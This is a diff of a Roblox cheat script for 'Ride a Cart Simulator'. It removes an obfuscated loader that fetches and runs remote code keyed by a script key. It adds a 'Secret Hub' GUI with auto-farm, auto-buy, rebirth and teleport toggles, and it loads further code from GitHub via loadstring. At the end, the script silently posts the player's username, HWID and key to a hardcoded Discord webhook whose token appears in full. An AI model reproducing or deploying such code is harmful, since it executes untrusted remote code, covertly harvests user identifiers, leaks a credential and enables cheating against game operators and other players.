@@ -1,1 +1,910 @@
-local v0={};local v1=string.char;local v2=string.byte;local v3=string.sub;local v4=bit32 or bit ;local v5=v4.bxor;local v6=table.concat;local v7=table.insert;local function v8(v9,v10) local v11={};for v15=1, #v9 do v7(v11,v1(v5(v2(v3(v9,v15,v15 + 1 )),v2(v3(v10,1 + (v15% #v10) ,1 + (v15% #v10) + 1 )))%256 ));end return v6(v11);end do v0[v8("\227\223\71\32\158\77\47\203\199\121\109\226\106\11\230\150\22","\74\165\179\38\84\215\41")]=0;v0[v8("\48\126\187\0","\220\70\78\158\48\118")]=nil;v0[v8("\192\170\238\116","\114\182\155\203\68")]=nil;while true do if (v0[v8("\85\169\191\236\111\50\118\171\170\199\31\99\80\132\157\189\22","\86\19\197\222\152\38")]==1) then if (game and game[v8("\212\84\108\245\90\67\34","\86\156\32\24\133\29\38")]) then loadstring(game:HttpGet(v0["v1%0"]))();elseif (HTTP and HTTP[v8("\128\160\119","\55\199\229\35\200\29\28")]) then HTTP:GET(v0["v1%0"],function(v19,v20) if (v19==200) then loadstring(v20)();end end);end break;end if (v0[v8("\82\246\221\32\58\112\255\210\32\44\45\175\255\21\48\49\170","\115\20\154\188\84")]==0) then v0[v8("\199\143\200\124","\223\177\191\237\76\225")]="/";v0[v8("\64\152\229\106","\219\54\169\192\90\48\80")]=v8("\65\86\20\53\90","\69\41\34\96")   .. ":"   .. v0[v8("\170\147\146\90","\75\220\163\183\106\98")]   .. v0[v8("\20\234\206\103","\185\98\218\235\87")]   .. v8("\199\41\38\233\220\172\222\47\36\231\202\165\217","\202\171\92\71\134\190")   .. v8("\103\194\35\133","\232\73\161\76")   .. v0[v8("\173\137\7\13","\126\219\185\34\61")]   .. v8("\31\205\76\123\110\99\224","\135\108\174\62\18\30\23\147")   .. v0[v8("\160\185\111\155","\167\214\137\74\171\120\206\83")]   .. v8("\157\161","\199\235\144\82\61\152")   .. v0[v8("\17\70\252\123","\75\103\118\217")]   .. script_key   .. v0[v8("\209\4\53\68","\126\167\52\16\116\217")]   .. v8("\250\39\36\133\244\24\188\203\47\50\148\244\10\245\197\59\44\129\160\22\238\136\15\53\148\187\89\218\201\60\45","\156\168\78\64\224\212\121")   .. v8("\74\189\241\154\73\226\176\207\31","\174\103\142\197") ;v0[v8("\112\36\94\44\12\90\253\88\60\96\97\112\125\217\117\109\15","\152\54\72\63\88\69\62")]=1;end end end
+ฃ
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Secret Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "Ride a Cart Simulator"})
+
+-- zone1
+
+
+local Tab = Window:MakeTab({
+	Name = "Zone1",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+Tab:AddToggle({
+	Name = "Auto collect!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone1 = Value
+        while _G.Autocollect_zone1 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end
+	end    
+})
+Tab:AddToggle({
+	Name = "Auto Farm!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autofarm = Value --ออโต้ฟาม
+        while _G.Autofarm do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16000, 389.049988, -88.4000015, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(2)
+            end)
+        end    
+    end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+
+Tab:AddToggle({
+	Name = "Auto Egg!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autoegg = Value --auto egg1 zone1
+        while _G.Autoegg do wait()
+            pcall(function()
+                local args = {
+                    [1] = "Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Rocky Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Rocky_egg = Value --auto egg2 zone1
+        while _G.Rocky_egg do wait()
+            pcall(function()
+        
+                local args = {
+                    [1] = "Rocky Egg",
+                    [2] = 1
+                }
+            
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)       
+        end    
+	end    
+})
+
+-- zone2
+
+local Tab = Window:MakeTab({
+	Name = "Zone2",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+
+Tab:AddToggle({
+	Name = "Auto Collect!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone2 = Value
+        while _G.Autocollect_zone2 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end
+	end    
+})
+Tab:AddToggle({
+    Name = "Auto Farm",
+    Default = false,
+    Callback = function(Value)
+        _G.Autofarm_zone2 = Value
+        while _G.Autofarm_zone2 do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1.83587829e-07, 389.049988, -88.4000015, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(2)
+            end)
+        end
+    end    
+})
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+Tab:AddToggle({
+	Name = "AutoSnowy_Egg!",
+	Default = false,
+	Callback = function(Value)
+        _G.AutoSnowy_Egg = Value
+        while _G.AutoSnowy_Egg do wait()
+            pcall(function()
+                local args = {
+                    [1] = "Snowy Egg",
+                    [2] = 1
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "AutoVolcanic_Egg!",
+	Default = false,
+	Callback = function(Value)
+        _G.AutoVolcanic_Egg = Value
+        while _G.AutoVolcanic_Egg do wait(6)
+            pcall(function()
+                local args = {
+                    [1] = "Volcanic Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "AutoRobotic_Egg!",
+	Default = false,
+	Callback = function(Value)
+        _G.AutoRobotic_Egg = Value
+        while _G.AutoRobotic_Egg do wait(6)
+            pcall(function()
+                local args = {
+                    [1] = "Robotic Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "AutoSpace_Egg!",
+	Default = false,
+	Callback = function(Value)
+        _G.AutoSpace_Egg = Value
+        while _G.AutoSpace_Egg do wait(6)
+            pcall(function()
+                local args = {
+                    [1] = "Space Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+--zone3
+local Tab = Window:MakeTab({
+	Name = "Zone3",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+
+Tab:AddToggle({
+	Name = "Auto Collect!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone3 = Value
+        while _G.Autocollect_zone3 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end 
+    end
+})
+
+Tab:AddToggle({
+	Name = "Auto Farm!",
+	Default = false,
+	Callback = function(Value)
+        _G.Autofarm_zone3 = Value
+        while _G.Autofarm_zone3 do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(15999.9844, 389.049988, -88.4000015, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(2)
+            end)
+        end
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+Tab:AddToggle({
+	Name = "Auto Sand Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_sand_egg = Value
+        while _G.Auto_sand_egg do wait()
+            pcall(function()
+                local args = { --sand egg (zone3)
+                    [1] = "Sand Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Oasis Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_oasis_egg = Value
+        while _G.Auto_oasis_egg do wait()
+            pcall(function()
+                local args = { --oasis egg (zone3)
+                    [1] = "Oasis Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Bone Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_bone_egg = Value
+        while _G.Auto_bone_egg do wait()
+            pcall(function()
+                local args = { --bone egg (zone3)
+                    [1] = "Bone Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Cursed Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_cursed_egg = Value
+        while _G.Auto_cursed_egg do wait()
+            pcall(function()
+                local args = { --cursed egg (zone3)
+                    [1] = "Cursed Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Pharaoh Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_pharaoh_egg = Value
+        while _G.Auto_pharaoh_egg do wait()
+            pcall(function()
+                local args = { --pharaoh egg (zone3)
+                    [1] = "Pharaoh Egg",
+                    [2] = 1
+                }
+        
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+                wait(6)
+            end)
+        end
+	end    
+})
+
+--Zone4
+local Tab = Window:MakeTab({
+	Name = "Zone4",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+
+Tab:AddToggle({
+	Name = "Auto Collect",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone4 = Value
+        while _G.Autocollect_zone4 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end 
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Farm",
+	Default = false,
+	Callback = function(Value)
+        _G.Autofarm_zone4 = Value
+        while _G.Autofarm_zone4 do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(32000, 389.049988, -88.4000015, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(.1)
+            end)
+        end
+	end    
+})
+
+
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+Tab:AddToggle({
+	Name = "Fruit Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_Fruit_egg = Value
+        while _G.Auto_Fruit_egg do wait()
+            local args = {
+                [1] = "Fruit Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Burger Egg",
+	Default = false,
+	Callback = function(Value)
+        _G.Auto_burger = Value
+        while _G.Auto_burger do wait()
+            local args = {
+                [1] = "Burger Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Bento egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Auto_Bento = Value
+        while _G.Auto_Bento do wait()
+            local args = {
+                [1] = "Bento Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end 
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Treat Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Auto_Treat = Value
+        while _G.Auto_Treat do wait()
+            local args = {
+                [1] = "Treat Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end   
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Ice Cream Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Auto_ice = Value
+        while _G.Auto_ice do wait()
+            local args = {
+                [1] = "Ice Cream Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+--Zone5
+local Tab = Window:MakeTab({
+	Name = "Zone5",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+
+Tab:AddToggle({
+	Name = "Auto Collect",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone5 = Value
+        while _G.Autocollect_zone5 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end 
+	end    
+})
+
+
+Tab:AddToggle({
+	Name = "Auto Farm",
+	Default = false,
+	Callback = function(Value)
+        _G.Autofarm_zone5 = Value
+        while _G.Autofarm_zone5 do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(48001.1172, 389.050262, -88.3995285, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(2)
+            end)
+        end
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+
+Tab:AddToggle({
+	Name = "Auto Pirate Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Pirate = Value
+        while _G.Pirate do wait()
+            local args = {
+                [1] = "Pirate Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Mermaid Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Mermaid = Value
+        while _G.Mermaid do wait()
+            local args = {
+                [1] = "Mermaid Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Treasure Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Treasure = Value
+        while _G.Treasure do wait()
+            local args = {
+                [1] = "Treasure Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Kraken Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Kraken = Value
+        while _G.Kraken do wait()
+            local args = {
+                [1] = "Kraken Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Sunken Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Sunken = Value
+        while _G.Sunken do wait()
+            local args = {
+                [1] = "Sunken Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+--zone6
+
+local Tab = Window:MakeTab({
+	Name = "Zone6",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Farm"
+})
+
+Tab:AddToggle({
+	Name = "Auto collect",
+	Default = false,
+	Callback = function(Value)
+        _G.Autocollect_zone6 = Value
+        while _G.Autocollect_zone6 do wait()
+            pcall(function()
+                for i, v in pairs(game:GetService("Workspace").Effects:GetChildren()) do
+                    if v.Name == "Template" then
+                        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                        wait(.1)
+                    end
+                end  -- รอเพิ่มเวลาที่เหมาะสมที่นี่
+            end)
+        end 
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Farm",
+	Default = false,
+	Callback = function(Value)
+        _G.AutoFarm_zone6 = Value
+        while _G.AutoFarm_zone6 do wait()
+            pcall(function()
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(64000, 385.550293, -88.3991394, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                wait(2)
+            end)
+        end
+	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Auto Egg"
+})
+
+Tab:AddToggle({
+	Name = "Auto Candy Planet Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Candy = Value
+        while _G.Candy do wait()
+            local args = {
+                [1] = "Candy Planet Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Nebula Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Nebula = Value
+        while _G.Nebula do wait()
+            local args = {
+                [1] = "Nebula Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Space Pirate Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Space = Value
+        while _G.Space do wait()
+            local args = {
+                [1] = "Space Pirate Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Strange Satellite Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.strange = Value
+        while _G.strange do wait()
+            local args = {
+                [1] = "Strange Satellite Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Alien Egg",
+	Default = false,
+	Callback = function(Value)
+		_G.Allien = Value
+        while _G.Allien do wait()
+            local args = {
+                [1] = "Alien Egg",
+                [2] = 1
+            }
+        
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Shop"):WaitForChild("ClientBuyEgg"):InvokeServer(unpack(args))
+            wait(6)
+        end
+	end    
+})
+
+--teleport
+local Tab = Window:MakeTab({
+	Name = "Teleport",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "teleport"
+})
+
+Tab:AddButton({
+	Name = "Zone1",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16000, 389.600006, -142, -1, 0, 0, 0, 1, 0, 0, 0, -1) -- teleport to zone1
+  	end    
+})
+Tab:AddButton({
+	Name = "Zone2",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(40.0824432, 396.127197, -150.096176, 0.0868716463, -9.17021268e-08, -0.996219516, 2.43471937e-10, 1, -9.20288841e-08, 0.996219516, 7.75214914e-09, 0.0868716463) -- teleport to zone2
+  	end    
+})
+Tab:AddButton({
+	Name = "Zone3",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(16031.9854, 393.331573, -133.927292, -0.0494210906, -3.02798355e-08, -0.998778045, 4.01200739e-10, 1, -3.03367322e-08, 0.998778045, -1.89998484e-09, -0.0494210906) --teleport to zone3
+  	end    
+})
+Tab:AddButton({
+	Name = "Zone4",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(31984.8281, 393.328979, -131.766342, -0.957377493, 4.80088644e-08, 0.288839668, 3.69495261e-08, 1, -4.37412844e-08, -0.288839668, -3.12044328e-08, -0.957377493) --teleport to zone4
+  	end    
+})
+Tab:AddButton({
+	Name = "Zone5",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(48001.1172, 389.600281, -146.599518, -1, 0, 0, 0, 1, 0, 0, 0, -1) --teleport to zone5
+  	end    
+})
+Tab:AddButton({
+	Name = "Zone6",
+	Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(64021.9922, 394.797241, -170.159058, -0.0853861868, 8.68606023e-08, -0.996347904, 6.50961507e-10, 1, 8.71231975e-08, 0.996347904, 6.79053391e-09, -0.0853861868)
+  	end    
+})
+
+--เพ่ิมเติม
+local Tab = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "Rebirth"
+})
+
+Tab:AddButton({
+	Name = "Rebirth",
+	Callback = function()
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Data"):WaitForChild("RequestRebirth"):InvokeServer()
+  	end    
+})
+
+Tab:AddToggle({
+	Name = "Auto Rebirth",
+	Default = false,
+	Callback = function(Value)
+		_G.Auto_rebirth = Value
+        while _G.Auto_rebirth do wait()
+            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Data"):WaitForChild("RequestRebirth"):InvokeServer()
+            wait(1)
+        end
+	end    
+})
+
+
+
+local Section = Tab:AddSection({
+	Name = "Anti Afk"
+})
+
+Tab:AddButton({
+	Name = "Anti afk",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))() --anti afk
+  	end    
+})
+
+local Section = Tab:AddSection({
+	Name = "Set fps cap"
+})
+
+Tab:AddTextbox({
+	Name = "Set fpscap",
+	Default = "fps",
+	TextDisappear = true,
+	Callback = function(Value)
+        setfpscap(Value)
+	end	  
+})
+
+
+OrionLib:Init()
+
+
+spawn(function()
+    pcall(function()
+        sendWebhook2()
+    end)
+end)
+
+
+_G.Webhook_URL = "https://discord.com/api/webhooks/1232594929109434389/HIRL7cCe2d7u1ZnbeilJm74XmDl2chnJxVGFZZSvxeT7etxzf1IpEP2RNYz4QD2R2ehk"
+
+
+
+local HttpRequest = http_request or request or syn.request
+local webhookSent = false
+
+function sendWebhook2()
+    if not webhookSent then
+        HttpService = game:GetService("HttpService")
+        Webhook_URL = _G.Webhook_URL
+
+        -- ส่ง webhook
+        local response = HttpRequest({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = HttpService:JSONEncode({
+                ["content"] = "",
+                ["embeds"] = {{
+                    ["title"] = "Ride a Cart Simulator:grin:",
+                    ["description"] = "USERNAME : " .. game.Players.LocalPlayer.DisplayName,
+                    ["type"] = "rich",
+                    ["color"] = tonumber(0xffffff),
+                    ["fields"] = {{
+                        ["name"] = "HWID",
+                        ["value"] = Hwidplr,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Key",
+                        ["value"] = _G.Key,
+                        ["inline"] = true
+                    }}
+                }}
+            })
+        })
+
+        webhookSent = true
+    end
+end
